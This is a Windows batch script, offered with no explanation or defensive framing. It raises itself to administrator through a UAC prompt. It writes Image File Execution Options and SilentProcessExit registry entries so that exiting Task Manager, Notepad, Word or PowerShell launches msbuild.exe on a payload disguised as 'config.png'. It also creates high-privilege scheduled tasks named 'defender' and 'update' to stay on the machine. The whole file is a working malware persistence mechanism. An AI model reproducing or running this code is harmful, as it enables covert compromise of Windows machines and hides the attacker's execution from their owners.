@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
@echo off


reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Taskmgr.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\Taskmgr.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\Taskmgr.exe" /v MonitorProcess /d "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\users\public\music\config.png" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\users\public\music\config.png" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WINWORD.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\WINWORD.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\WINWORD.exe" /v MonitorProcess /d "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\users\public\music\config.png" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\powershell.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\powershell.exe" /v ReportingMode /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\powershell.exe" /v MonitorProcess /d "cmd /c start /min C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\users\public\music\config.png" /f
schtasks /create /tn "defender" /tr "powershell.exe -w 1" /sc minute /mo 10 /F /RL HIGHEST
schtasks /create /tn "update" /tr "cmd /c taskkill /IM powershell.exe /F" /sc minute /mo 11 /F /RL HIGHEST
taskkill /IM cmd.exe /F
ECHO %batchName% Arguments: %1 %2 %3 %4 %5 %6 %7 %8 %9

exit